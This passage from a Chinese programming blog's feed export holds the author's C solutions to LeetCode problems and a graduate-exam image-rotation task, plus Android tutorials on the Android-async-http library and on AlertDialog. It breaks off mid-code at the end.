0。根据丑数的定义，丑数只能被2、3和5整除。也就是说如果一个数如果它能被2整除，我们把它连续除以2；如果能被3整除，就连续除以3；如果能被5整除，就除以连续5。如果最后我们得到的是1，那么这个数就是丑数，否则不是。 LeetCode AC的代码1234567891011121314bool isUgly(int num) &#123; if(num&lt;=0) return false; while(num%2==0) //连续除以2 num /= 2; while(num%3==0) //连续除以3 num /= 3; while(num%5==0) //连续除以5 num /= 5; if(num == 1) //如果最后得到1，则证明只能被2，3，5整除，即为丑数 return true; else return false;&#125; Problem B. 旋转图像北邮2014年研究生复试机试题 题目描述在图形学中，我们经常需要对具体的图像进行一些处理。在这个问题中，你的任务是将一幅只包含01像素点的图片进行顺时针旋转。旋转的角度仅包含0度，90度，180度，270度。 输入格式 输入的第一行是一个整数T（T&lt;=50），表示输入的数据组数。 每组测试数据的第一行是两个整数N和M，（1&lt;=N,M&lt;=50），表示图片的高度和宽度。 接下来N行，每行是一个长度为M的01串，表示图片的像素点。 最后一行是一个整数angle，表示旋转的角度。 输出格式 对于每组测试数据，输出旋转后得到的图片。请注意不要输出多余的空格或空行。 12345678910111213141516171819输入样例22 3111000903 3111101111180输出样例010101111101111 思路分析此题的关键在于选择合适的存储方式，因为题目中图片有宽高，输入的情况类似于一个矩阵，因此可采用二维数组来存储输入的字符，然后根据旋转角度分情况将字符数组按要求输出即可。 C语言实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void rotate0(char** s,int n,int m)&#123; int i; for(i=0;i&lt;n;i++) printf(&quot;%s\n&quot;,s[i]);&#125;void rotate90(char** s,int n,int m)&#123; int i,j; for(i=0;i&lt;m;i++) &#123; for(j=n-1;j&gt;=0;j--) &#123; printf(&quot;%c&quot;,s[j][i]); &#125; printf(&quot;\n&quot;); &#125;&#125;void rotate180(char** s,int n,int m)&#123; int i,j; for(i=n-1;i&gt;=0;i--) &#123; for(j=0;j&lt;m;j++) &#123; printf(&quot;%c&quot;,s[i][j]); &#125; printf(&quot;\n&quot;); &#125;&#125;void rotate270(char** s,int n,int m)&#123; int i,j; for(i=0;i&lt;m;i++) &#123; for(j=0;j&lt;n;j++) &#123; printf(&quot;%c&quot;,s[j][i]); &#125; printf(&quot;\n&quot;); &#125;&#125;int main()&#123; int t,m,n,i,j,angle; char **s; //定义二维字符数组 scanf(&quot;%d&quot;,&amp;t); while(t--)&#123; scanf(&quot;%d %d&quot;,&amp;n,&amp;m); s = (char **)malloc(sizeof(char *)*n); //为二维数组动态分配内存 for(i=0;i&lt;n;i++) &#123; s[i] = (char *)malloc(sizeof(char)*m); scanf(&quot;%s&quot;,s[i]); //输入字符串 &#125; scanf(&quot;%d&quot;,&amp;angle); switch(angle)&#123; case 0: rotate0(s,n,m); break; //旋转0度 case 90: rotate90(s,n,m); break; //旋转90度 case 180: rotate180(s,n,m); break; //旋转180度 case 270: rotate270(s,n,m); break; //旋转270度 &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(四)]]></title>
    <url>%2F2016%2F08%2F16%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%9B%9B%2F</url>
    <content type="text"><![CDATA[Add BinaryLeetCode第67题 题目描述Given two binary strings, return their sum (also a binary string). For example, a = “11” b = “1” Return “100”. 思路分析一开始想到的方法是先将字符串转换成十进制数，再按十进制进行加处理，最后再将结果转换成二进制进行输出，然后试了好久一直超时，可能是效率太低了吧，一直都没有得到AC的结果。 最后，还是参考了一下别人的思路：字符串按位相加，先将两个字符串的相同部分从字符串尾部开始进行按位加操作，记录进位，并且加到下一位去，将加的结果存到另一个字符串中，再将长那一部分字符与上一步得到的进位进行按位加，同样将加的结果存在第三个字符串，如果最后还有进位，再把最后的进位加到字符串的尾部，但是最后得到的字符串并不是题目要求的结果，而是题目要求的结果的逆序字符串，所以还得进行字符串反转。 LeetCode AC的代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667char* addBinary(char* a, char* b) &#123; int len1,len2,len3,i,j,num,flag=0; char *c,temp; len1 = strlen(a) - 1; len2 = strlen(b) - 1; c = (char *)malloc(sizeof(char)*100); //为结果字符串分配内存空间 i=0; while(len1&gt;=0&amp;&amp;len2&gt;=0) //从最低位开始将a字符串与b字符串等长的那一部分按位加 &#123; num = (a[len1]-&apos;0&apos;)+(b[len2]-&apos;0&apos;)+flag; flag = num/2; //判断是否有进位 num = num%2; //得到该位相加的结果 c[i] = (char)(num+&apos;0&apos;); //添加到结果字符串 len1--; //移动到下一次字符 len2--; //移动到下一次字符 i++; &#125; while(len1&gt;=0) //如果a字符串比b长，则将a比b长的那一部分将入到结果字符串 &#123; num = (a[len1]-&apos;0&apos;)+flag; flag = num/2; num = num%2; c[i] = (char)(num+&apos;0&apos;); len1--; len2--; i++; &#125; while(len2&gt;=0) //如果b字符串比a长，则将b比a长的那一部分将入到结果字符串 &#123; num = (b[len2]-&apos;0&apos;)+flag; flag = num/2; num = num%2; c[i] = (char)(num+&apos;0&apos;); len1--; len2--; i++; &#125; if(flag&gt;0) //处理最后的进位 &#123; c[i] = (char)(flag+&apos;0&apos;); i++; &#125; c[i] = &apos;\0&apos;; //添加字符串结束符 len3 = strlen(c); for(j=0;j&lt;len3/2;j++) //将结果字符串反转 &#123; temp = c[j]; c[j] = c[len3-1-j]; c[len3-1-j] = temp; &#125; return c; //返回结果字符串&#125; Length of Last WordLeetCode第58题 题目描述Given a string s consists of upper/lower-case alphabets and empty space characters ‘ ‘, return the length of last word in the string. If the last word does not exist, return 0. Note: A word is defined as a character sequence consists of non-space characters only. For example,Given s = “Hello World”,return 5. 思路分析从头开始记录每个单词的长度，再判断空格的位置，空格之后还有单词则清空对前一个单词长度的记录，记录这个单词的长度，直到找到最后一个单词。 LeetCode AC的代码123456789101112131415161718192021222324int lengthOfLastWord(char* s) &#123; int i,j,count=0; for(i=0;s[i]!=&apos;\0&apos;;i++) &#123; if(isalpha(s[i])) //判断是不是字母 &#123; count++; //记录word长度 continue; &#125; if(isspace(s[i])) //如果是空格，则判断之后是否还有空格，如果有则不是最后的字符串，否则是最后的字符串 &#123; for(j=i;a[j]!=&apos;\0&apos;;j++) &#123; if(isspace(s[j])) //如果是连续的空格则继续下一个字符 continue; else //如果空格后还有字符，则进入下一次循环 break; &#125; if(s[j]!=&apos;\0&apos;) //如果不是最后的word，则将计数清空 count=0; &#125; &#125; return count; //返回word的长度&#125; Power of ThreeLeetCode第326题 题目描述Given an integer, write a function to determine if it is a power of three. Follow up:Could you do it without using any loop / recursion? 思路分析判断是否是3的次方，让这个数一直除以3，如果余数全为0，则可判定为3的指数。 LeetCode AC的代码12345678910111213bool isPowerOfThree(int n) &#123; if(n&lt;=0) return false; if(n == 1) return true; while(n&gt;1) &#123; if(n%3) return false; //判断余数是不是0，是则继续下一步，否则判定为不是3的次方 n = n/3; //得到商 &#125; return true;&#125; Power of FourLeetCode第342题 题目描述Given an integer (signed 32 bits), write a function to check whether it is a power of 4. Example: Given num = 16, return true. Given num = 5, return false. Follow up: Could you solve it without loops/recursion? 思路分析此题与上一题思路一致。 LeetCode AC的代码12345678910111213bool isPowerOfFour(int num) &#123; if(num&lt;=0) return false; if(num == 1) return true; while(num&gt;1) &#123; if(num%4) return false; num = num/4; &#125; return true;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(三)]]></title>
    <url>%2F2016%2F08%2F14%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%89%2F</url>
    <content type="text"><![CDATA[Power of TwoLeetCode第231题 题目描述Given an integer, write a function to determine if it is a power of two. 思路分析i&amp;(i - 1)是用来判断一个数是否是2的指数的快捷方法，比如8，二进制位1000, 那么8&amp;(8-1)为0，只要&amp;的结果为0就是2的指数。 leetcode AC的代码12345678910111213bool isPowerOfTwo(int n) &#123; if(n&lt;=0) &#123; return false; &#125; else &#123; if(n&amp;(n-1)) return false; else return true; &#125;&#125; 提交上面的代码之后发现这个效率还是不太高啊，于是又到讨论区去学习了一下别人的思路，以下是一个相对高效的代码： 1234567891011121314bool isPowerOfTwo(int n) &#123; //int型最大32位，但是最大值取不到，所以最大的2的次方只能到0x40000000 int ref = 0x40000000; if(n&lt;=0) &#123; return false; &#125; else &#123; while( ref &gt; n) ref &gt;&gt;= 1; //如果n比ref小，则ref移位直到ref小于n //ref始终是2的次方 return ( n == ref ) ? true : false; //比较n与ref是否相等 &#125;&#125; Reverse StringLeetCode第344题 题目描述Write a function that takes a string as input and returns the string reversed. Example: Given s = “hello”, return “olleh”. 思路分析字符串反转，其实也是比较简单的一道题，最近在做考研数据结构的复习题，在线性表的课后习题中看到了类似的考题。基本思路就是字符互换。 leetcode AC的代码123456789101112char* reverseString(char* s) &#123; int len,i; char temp; len = strlen(s); //获取字符串长度 for(i=0;i&lt;len/2;i++) //进行前半段字符与后半段字符的依次互换 &#123; temp = s[i]; s[i] = s[len-1-i]; s[len-1-i] = temp; &#125; return s;&#125; 这也是AC的代码，从字符串两端开始互换，运行起来比上一个要快一点点 12345678910111213141516char* reverseString(char* s) &#123; int len,start,end; char temp; len = strlen(s); //获取字符串长度 start = 0; //字符串开始位置 end = len -1; //字符串结束位置 while(start&lt;end) //字符互换并移到下一个字符 &#123; temp = s[start]; s[start] = s[end]; s[end] = temp; start++; end--; &#125; return s;&#125; 本地测试时的代码1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; char *str; str = (char *)malloc(sizeof(char)*100); scanf(&quot;%s&quot;,str); len = strlen(str); for(i=0;i&lt;len/2;i++) &#123; temp = p[i]; p[i] = p[len-1-i]; p[len-1-i] = temp; &#125; printf(&quot;%s&quot;,p); return 0;&#125; Reverse Vowels of a StringLeetCode第345题 题目描述Write a function that takes a string as input and reverse only the vowels of a string. Example 1: Given s = “hello”, return “holle”. Example 2: Given s = “leetcode”, return “leotcede”. Note:The vowels does not include the letter “y”. 思路分析将字符串中的元音字母进行互换。从字符串的头尾两端进行扫描，发现元音字母就将标志位置为并停止移动，当两边都找到一个元音字母时就进行互换，再清空标志位，继续移位寻找。 leetcode AC的代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950char isVowels(char c)&#123; switch(c) &#123; case &apos;a&apos;: case &apos;o&apos;: case &apos;e&apos;: case &apos;i&apos;: case &apos;u&apos;: case &apos;A&apos;: case &apos;O&apos;: case &apos;E&apos;: case &apos;I&apos;: case &apos;U&apos;: return 1; default: return 0; &#125; return 0;&#125;char* reverseVowels(char* s) &#123; int len,start,end,start_flag,end_flag; char temp; len = strlen(s); start = 0; end = len - 1; while(start &lt; end) &#123; if(isVowels(s[start])) start_flag = 1; //找到元音字母，则将标志位置为1，并停止移动 else start++; if(isVowels(s[end])) end_flag = 1; //找到元音字母，则将标志位置为1，并停止移动 else end--; if((start_flag == 1)&amp;&amp;(end_flag == 1)) //左右标志位均被置位时进行互换 &#123; temp = s[start]; s[start] = s[end]; s[end] = temp; start_flag = 0; //标志位清零 end_flag = 0; start++; //继续移动 end--; &#125; &#125; return s;&#125; 本地测试的代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;char isVowels(char c)&#123; switch(c) &#123; case &apos;a&apos;: case &apos;o&apos;: case &apos;e&apos;: case &apos;i&apos;: case &apos;u&apos;: case &apos;A&apos;: case &apos;O&apos;: case &apos;E&apos;: case &apos;I&apos;: case &apos;U&apos;: return 1; default: return 0; &#125; return 0;&#125;int main()&#123; int len,start,end,start_flag,end_flag; char *str,temp; str = (char *)malloc(sizeof(char)*100); scanf(&quot;%s&quot;,str); len = strlen(str); printf(&quot;%d&quot;,len); start = 0; end = len - 1; while(start &lt; end) &#123; if(isVowels(str[start])) start_flag = 1; else start++; if(isVowels(str[end])) end_flag = 1; else end--; if((start_flag == 1)&amp;&amp;(end_flag == 1)) &#123; temp = str[start]; str[start] = str[end]; str[end] = temp; start_flag = 0; end_flag = 0; start++; end--; &#125; &#125; printf(&quot;%s&quot;,str); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android网络请求框架Android-async-http]]></title>
    <url>%2F2016%2F08%2F14%2FAndroid%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%A1%86%E6%9E%B6Android-async-http%2F</url>
    <content type="text"><![CDATA[Http网络数据交互是Android中极其重要并且使用很频繁的模块。前段时间写了一篇博客总结了Android Http网络请求，但是其中还有很多没有考虑到的问题。众所周知，网络请求方式的效率和性能直接影响到APP的整体用户体验流畅性，在我们自己编写网络请求方法中往往不会考虑这么周全。但是，还好有技术大牛为我们提供了开源的第三方网络请求框架：Android-async-http。 Android-async-http简介Async-http是一款国外的开源框架，是基于Apache HttpClient库的，使用它可以方便快速高效的进行网络数据请求和发送，文件下载和上传。 特点： 清晰的网络请求回调； 内部采用线程池来处理并发请求，限制并发资源使用情况； http请求发生在UI（主）线程之外的异步线程中； 内置多部分文件上传，不需要第三方库支持； 流式Json上传，不需要额外的库； 在各种各样的移动连接环境中具备自动智能请求重试机制； 等等 简单应用下载jar包（1）Github地址：https://github.com/loopj/android-async-http （2）CSDN下载地址：http://download.csdn.net/detail/bambooofmottled/7866567 （3）也可以自己百度去找，这是一个很受欢迎的开源框架，资源很丰富。 添加到工程将jar包复制到工程的libs目录下，右键移到Build Path然后点击Add to Build Path。 封装自己的Http请求类封装了HTTP请求中最常见的GET和POST方法的请求，通过Handler在异步网络请求与UI主线程之间来传递消息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class HttpUtil &#123; private static AsyncHttpClient client; public static void doGet(String url, final Handler handler) &#123; client = new AsyncHttpClient(); //可以为Http请求添加头部信息，比如很多开放的API都需要添加申请到的api-key client.addHeader(&quot;键&quot;, &quot;值&quot;); client.get(url, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int statusCode, Header[] headers,byte[] responseBody) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印接收到的数据，以便调试 Message msg = new Message(); //将数据封装到Message中 msg.obj = response; handler.sendMessage(msg); //使用Handler将Message传给UI线程，以便刷新界面 &#125; @Override public void onFailure(int statusCode, Header[] headers,byte[] responseBody, Throwable error) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印错误信息，以便调试 &#125; &#125;); &#125; public static void doPost(String url, RequestParams params,final Handler handler) &#123; client = new AsyncHttpClient(); //可以为Http请求添加头部信息，比如很多开放的API都需要添加申请到的api-key client.addHeader(&quot;键&quot;, &quot;值&quot;); client.post(url, params, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int statusCode, Header[] headers,byte[] responseBody) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印接收到的数据，以便调试 Message msg = new Message(); msg.obj = response; //将数据封装到Message中 handler.sendMessage(msg); //使用Handler将Message传给UI线程，以便刷新界面 &#125; @Override public void onFailure(int statusCode, Header[] headers,byte[] responseBody, Throwable error) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印错误信息，以便调试 &#125; &#125;); &#125;&#125; 使用示例调用自己封装好的GET请求和POST请求方法都需要传递Handler来传递消息，以便在网络请求我完成时，将服务器返回的数据传递给UI线程，然后进行UI更新。 12345678910111213141516171819202122232425262728293031323334353637public class MainActivity extends Activity &#123; private Handler mGetHandler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; String res = (String) msg.obj; Toast.makeText(MainActivity.this, &quot;请求成功&quot;, Toast.LENGTH_SHORT).show(); System.out.println(res); //打印传递过来的数据 //此处，拿到数据之后就可以解析数据，比如JSON数据解析，然后进行UI的更新 &#125;; &#125;; private Handler mPostHandler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; String res = (String) msg.obj; Toast.makeText(MainActivity.this, &quot;请求成功&quot;, Toast.LENGTH_SHORT).show(); System.out.println(res); //打印传递过来的数据 //此处，拿到数据之后就可以解析数据，比如JSON数据解析，然后进行UI的更新 &#125;; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); String getUrl = &quot;你的get请求的url&quot;; HttpUtil.doGet(getUrl, mGetHandler); String postUrl = &quot;你的post请求的url&quot;; RequestParams params = new RequestParams(); params.add(&quot;键&quot;, &quot;值&quot;); //可通过add方法添加多个请求参数 HttpUtil.doPost(postUrl, params, mPostHandler); &#125;&#125; 此博客主要展示了如何使用Android-async-http的GET和POST请求，这也是我自己在开发中最常用的两个请求方法，虽然这只是这个强大的网络请求库的一部分功能，但是这已经让我的开发变得更方便高效，也使得开发的应用程序的网络请求能够稳定高效，除此之外，Android-async-http还有很多优秀的功能，有机会再好好挖掘，先分享到这里。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,网络］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android AlertDialog详解]]></title>
    <url>%2F2016%2F08%2F13%2FAndroid-AlertDialog%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[AlertDialog就是Android中的弹出式对话框，很多应用中都有对AlertDialog的应用。前段时间，一位学长问我自定义AlertDialog的问题，因为自己也只是之前用过，并不是很熟悉，所以我也只能很抱歉地回绝了，这一次通过写这篇博客对AlertDialog的操作进行了详细的总结，介绍了AlertDialog类和AlertDialog.Builder类，以及给AlertDialog设置不同的内容，最后还实现了自定义的AlertDialog。 AlertDialog继承自Dialog类，对于Android内置的AlertDialog，它可以包含一个标题、一个内容消息或者一个选择列表、最多三个按钮。而创建AlertDialog推荐使用它的一个内部类AlertDialog.Builder创 建，使用Builder对象，可以设置AlertDialog的各种属性，最后通过Builder.create()就可以得到AlertDialog对 象，再使用Builder.show()方法来显示。 官方图解： （1）区域1是AlertDialog对话框的头部信息区域，包括标题名或者是一个图标。 （2）区域2是AlertDialog对话框的内容部分，在这里我们可以设置Message信息或者是选择框，还可以设置自定义的布局弹出框。 （3）区域3是AlertDialog对话框的操作按钮部分，可以设置相应的按钮。 AlertDialog类常用方法 方法 描述 setTitle(CharSequence title) 为对话框设置标题 setIcon(Drawable icon) 通过Drawable资源对象为对话框设置图标 setIcon(int resId) 通过资源ID为对话框设置图标 setButton(int whichButton, CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加按钮 setMessage(CharSequence message) 为对话框设置提示内容 使用示例12345678910111213141516171819202122AlertDialog dialog = new AlertDialog.Builder(this).create();dialog.setTitle(&quot;退出&quot;);dialog.setMessage(&quot;是否要退出&quot;);dialog.setButton(DialogInterface.BUTTON_NEGATIVE, &quot;取消&quot;,new OnClickListener() &#123; @Override public void onClick(DialogInterface arg0, int arg1) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;);dialog.setButton(DialogInterface.BUTTON_POSITIVE, &quot;确定&quot;,new OnClickListener() &#123; @Override public void onClick(DialogInterface arg0, int arg1) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;确定&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;);dialog.show(); AlertDialog.Builder类AlertDialog类提供了弹出框的一些基本的方法，但是要想设置更多的元素来丰富我们的弹出框就要使用到AlertDialog.Builder类了。 常用方法 方法 描述 setTitle(CharSequence title) 为对话框设置标题 setIcon(Drawable icon) 通过Drawable资源对象为对话框设置图标 setIcon(int resId) 通过资源ID为对话框设置图标 setMessage(CharSequence message) 为对话框设置提示内容 setNegativeButton(CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加取消按钮 setPositiveButton(CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加确定按钮 setNeutralButton(CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加中立按钮 setItems(CharSequence[] items, DialogInterface.OnClickListener listener) 为对话框设置列表项 setSingleChoiceItems(CharSequence[] items, int checkedItem, DialogInterface.OnClickListener listener) 为对话框设置单选列表项 setMultiChoiceItems(CharSequence[] items, boolean[] checkedItems, DialogInterface.OnMultiChoiceClickListener listener) 为对话框设置多选列表项 注意：setMessage()、setItems()、setSingleChoiceItems()、setMultiChoiceItems()方法不能同时使用。因为他们都是对弹出框的内容区域的设置。 设置按钮12345678910111213141516171819202122232425262728293031Builder builder = new AlertDialog.Builder(this);builder.setTitle(&quot;更新&quot;);builder.setMessage(&quot;是否要进行更新？&quot;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;确定&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setNeutralButton(&quot;忽略&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;忽略&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.show(); 设置列表项1234567891011121314final CharSequence items[] = new String[] &#123;&quot;北京&quot;,&quot;上海&quot;,&quot;广州&quot;,&quot;深圳&quot;,&quot;成都&quot;,&quot;南京&quot;&#125;;Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请选择&quot;);builder.setItems(items, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub String selectedItem = items[whitch].toString(); Toast.makeText(MainActivity.this, selectedItem, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.show(); 设置单选列表项1234567891011121314151617181920212223242526272829303132final CharSequence items[] = new String[] &#123;&quot;北京&quot;,&quot;上海&quot;,&quot;广州&quot;,&quot;深圳&quot;,&quot;成都&quot;,&quot;南京&quot;&#125;;Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请选择&quot;);builder.setSingleChoiceItems(items, 1, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub String selectedItem = items[whitch].toString(); Toast.makeText(MainActivity.this, selectedItem, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub dialog.dismiss(); &#125;&#125;);builder.show(); 设置多选列表项123456789101112131415161718192021222324252627282930313233CharSequence items[] = new String[] &#123;&quot;北京&quot;,&quot;上海&quot;,&quot;广州&quot;,&quot;深圳&quot;,&quot;成都&quot;,&quot;南京&quot;&#125;;boolean[] checkedItems = new boolean[] &#123;true,false,true,true,false,true&#125;; Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请选择&quot;);builder.setMultiChoiceItems(items, checkedItems, new OnMultiChoiceClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch, boolean isChecked) &#123; // TODO Auto-generated method stub &#125;&#125;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub dialog.dismiss(); &#125;&#125;);builder.show(); 自定义AlertDialog123456789101112131415161718192021222324252627282930Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请输入&quot;);// 通过LayoutInflater来加载布局文件作为一个View对象View view = LayoutInflater.from(MainActivity.this).inflate(R.layout.alterdialog, null);// 设置自定义的布局文件作为弹出框的内容builder.setView(view);final EditText username = (EditText) view.findViewById(R.id.et_username);final EditText password = (EditText) view.findViewById(R.id.et_password);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub String name = username.getText().toString().trim(); String pwd = password.getText().toString().trim(); Toast.makeText(MainActivity.this, name + pwd, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub dialog.dismiss(); &#125;&#125;);builder.show(); 以上多个方法的参数列表都有用到CharSequence，但是我的例子中直接使用的String，所以在这里做一个补充说明。 CharSequence与String的区别： CharSequence与String都能用于定义字符串，但CharSequence的值是可读可写序列，而String的值是只读序列。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,AlertDialog］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(二)]]></title>
    <url>%2F2016%2F08%2F12%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[Counting BitsLeetCode第338题 题目描述Given a non negative integer number num. For every numbers i in the range 0 ≤ i ≤ num calculate the number of 1’s in their binary representation and return them as an array. Example:For num = 5 you should return [0,1,1,2,1,2]. Follow up: It is very easy to come up with a solution with run time O(n*sizeof(integer)). But can you do it in linear time O(n) /possibly in a single pass? Space complexity should be O(n). Can you do it like a boss? Do it without using any builtin function like __builtin_popcount in c++ or in any other language. 思路分析列出前16个数的二进制表示以及1的个数： n(十进制表示) n(二进制表示) count[n]（1的个数） 0 0000 count[1] = 0 1 0001 count[1] = 1 2 0010 count[2] = 1 3 0011 count[3] = 2 4 0100 count[4] = 1 5 0101 count[5] = 2 = count[4] + count[1] 6 0110 count[6] = 2 = count[4] + count[2] 7 0111 count[7] = 3 = count[4] + count[3] 8 1000 count[8] = 1 9 1001 count[9] = 2 = count[8] + count[1] 10 1010 count[10] = 2 = count[8] + count[2] 11 1011 count[11] = 3 = count[8] + count[3] 12 1100 count[12] = 2 = count[8] + count[4] 13 1101 count[13] = 3 = count[8] + count[5] 14 1110 count[14] = 3 = count[8] + count[6] 15 1111 count[15] = 4 = count[8] + count[7] 16 10000 count[16] = 1 观察得： 在n&gt;3之后有如下规律： i&gt;2时，2的i次方中1的个数为1，例如，4，8，16； count[pow(2,i)] = 1； 4-8,8-16这些区间中的数的1的个数都可以拆分成两个数的1的个数的和。 count[pow(2,i) + j] = count[pow(2,i)] + count[j]，其中j在区间[1,pow(2,i)-1] leetcode AC的结果（C语言）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * Return an array of size *returnSize. * Note: The returned array must be malloced, assume caller calls free(). */int* countBits(int num, int* returnSize) &#123; int i,j; int m; int *p; *returnSize = ++num; p = (int *)malloc(sizeof(int)*(num)); //动态分配内存 if(num == 0) //num等于0时数组的值 &#123; p[0] = 0; &#125;else if(num == 1) //num等于1时数组的值 &#123; p[0] = 0; p[1] = 1; &#125;else if(num == 2) //num等于2时数组的值 &#123; p[0] = 0; p[1] = 1; p[2] = 1; &#125;else if(num == 3) //num等于3时数组的值 &#123; p[0] = 0; p[1] = 1; p[2] = 1; p[3] = 2; &#125;else //得到num大于4的情况下的数组的值（即1的个数） &#123; p[0] = 0; p[1] = 1; p[2] = 1; p[3] = 2; i=2; m = pow(2,i); while(m&lt;num)&#123; p[m] = 1; for(j=1;j&lt;m;j++) &#123; if(m+j&gt;=num) return p; p[m+j] = p[m] + p[j]; &#125; i++; m = pow(2,i); &#125; &#125; return p;&#125; AC之后去看了关于这道题的讨论，其实，自己把问题想的太复杂了，感觉还是智商不够用啊，看看别人的代码，长长见识： 解法一： 从1开始，遇到偶数时，其1的个数和该偶数除以2得到的数字的1的个数相同，遇到奇数时，其1的个数等于该奇数除以2得到的数字的1的个数再加1。 解法一C语言实现注：这是可直接运行的代码，并没有按leetcode的格式提交。123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int i,n; int *p; scanf(&quot;%d&quot;,&amp;n); p = (int *)malloc(sizeof(int)*(++n)); //动态分配内存 if(n == 1) p[0] = 0; else &#123; p[0] = 0; for(i=1;i&lt;n;i++) //得到1的个数 &#123; if(i%2 == 0) p[i] = p[i/2]; else p[i] = p[i/2] + 1; &#125; &#125; for(i=0;i&lt;n;i++) printf(&quot;%d &quot;,p[i]); printf(&quot;\n&quot;); return 0;&#125; 解法二： 利用此规律：每个i中1的个数都是i&amp;(i-1)中1的个数的值加1 解法二C语言实现注：这是可直接运行的代码，并没有按leetcode的格式提交。 12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int i,n; int *p; scanf(&quot;%d&quot;,&amp;n); p = (int 